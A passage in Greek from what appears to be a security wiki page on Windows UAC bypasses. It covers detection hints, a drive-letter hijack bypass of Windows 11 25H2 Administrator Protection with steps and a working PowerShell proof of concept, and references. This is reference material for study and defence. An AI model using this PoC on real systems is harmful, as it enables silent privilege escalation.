- Αναζήτηση του `iscsiexe.dll` σε **τοποθεσίες υπό τον έλεγχο του χρήστη**, όπως `%TEMP%` ή `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Συσχέτιση εκκινήσεων του `iscsicpl.exe` με μη αναμενόμενες child processes ή φορτώσεις DLL από τοποθεσίες εκτός των κανονικών καταλόγων των Windows.

### Νεότερη έρευνα που αξίζει να ελεγχθεί ξεχωριστά

Ορισμένες αλυσίδες μετά το 2024 δεν μοιάζουν πλέον με τα κλασικά registry hijacks του `HKCU\Software\Classes`. Για παράδειγμα, το activation-context cache poisoning μπορεί να συνδυάσει ένα **drive remap** και **DLL redirection** για μετάβαση από medium σε high integrity μέσω αξιόπιστων UI / auto-elevated binaries, όπως το `ctfmon.exe`, και αργότερα targets όπως το `fodhelper.exe`. Αντί να αντιγράψετε εδώ το μεγάλο PoC, ελέγξτε τα συνοπτικά payload examples στο:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Παράκαμψη drive-letter hijack του Administrator Protection (25H2) μέσω per-logon-session DOS device map

Για ολόκληρη την επιφάνεια επίθεσης `RAiLaunchAdminProcess` / UIAccess στο Windows 11 25H2, ελέγξτε την ειδική σελίδα:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Το “Administrator Protection” του Windows 11 25H2 χρησιμοποιεί shadow-admin tokens με per-session maps `\Sessions\0\DosDevices/<LUID>`. Ο κατάλογος δημιουργείται lazy από το `SeGetTokenDeviceMap` κατά την πρώτη επίλυση του `\??`. Αν ο attacker κάνει impersonate το shadow-admin token μόνο σε **SecurityIdentification**, ο κατάλογος δημιουργείται με owner τον attacker (κληρονομεί το `CREATOR OWNER`), επιτρέποντας drive-letter links που έχουν προτεραιότητα έναντι του `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Βήματα:**

1. Από μια session με χαμηλά privileges, καλέστε το `RAiProcessRunOnce` για να δημιουργήσετε ένα promptless shadow-admin `runonce.exe`.
2. Αντιγράψτε το primary token του σε token τύπου **identification** και κάντε impersonate αυτό το token ενώ ανοίγετε το `\??`, ώστε να εξαναγκάσετε τη δημιουργία του `\Sessions\0\DosDevices/<LUID>` με ownership του attacker.
3. Δημιουργήστε εκεί ένα symlink `C:` που δείχνει σε storage υπό τον έλεγχο του attacker· οι επόμενες προσβάσεις στο filesystem σε αυτή τη session θα επιλύουν το `C:` στη διαδρομή του attacker, επιτρέποντας DLL/file hijack χωρίς prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Πώς λειτουργεί το User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Συλλογή τεχνικών παράκαμψης του UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner συμβατότητας και launcher για παράκαμψη του UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – Το KONNI υιοθετεί AI για τη δημιουργία PowerShell backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Εκμετάλλευση 0-Day εναντίον κυβερνητικών στόχων στη Νοτιοανατολική Ασία](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Παράκαμψη του Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Παράκαμψη του UAC με χρήση της εργασίας SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
{{#include ../../banners/hacktricks-training.md}}
